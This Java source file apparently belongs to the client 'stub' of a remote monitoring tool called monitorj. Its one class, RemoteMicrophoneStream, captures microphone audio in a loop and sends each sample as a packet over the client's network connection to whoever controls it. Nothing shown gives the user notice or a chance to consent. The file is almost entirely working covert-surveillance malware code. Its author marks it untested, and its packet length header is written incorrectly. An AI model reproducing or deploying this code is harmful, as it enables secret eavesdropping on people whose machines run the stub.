package me.jershdervis.monitorj.stub.client.threads;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.Packets;

import javax.sound.sampled.*;
import java.io.DataOutputStream;

/**
 * Created by Josh on 4/07/2015.
 * TODO: UNTESTED
 */
public class RemoteMicrophoneStream implements Runnable {

    public static volatile boolean isStreaming = false;

    private float sampleRate = 16000.0F;
    private int sampleSizeBits = 16;
    private int channels = 1;
    private boolean signed = true;
    private boolean bigEndian = false;

    private final DataOutputStream outputStream;
    private final AudioFormat format;

    public RemoteMicrophoneStream(BaseClient client) {
        this.outputStream = client.getDataOutputStream();
        this.format = new AudioFormat(sampleRate, sampleSizeBits, channels, signed, bigEndian);
    }

    @Override
    public void run() {
        try {
            DataLine.Info micInfo = new DataLine.Info(TargetDataLine.class, this.format);
            TargetDataLine mic = (TargetDataLine) AudioSystem.getLine(micInfo);
            mic.open(this.format);

            byte tmpBuff[] = new byte[mic.getBufferSize() / 5];
            mic.start();
            while (isStreaming) {
                int count = mic.read(tmpBuff, 0, tmpBuff.length);
                if (count > 0) {
                    this.outputStream.writeByte(Packets.REMOTE_MIC_SAMPLE.getPacketID());
                    this.outputStream.writeInt(tmpBuff.length);
                    this.outputStream.write(tmpBuff, 0, count);
                }
            }
            mic.drain();
            mic.close();
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
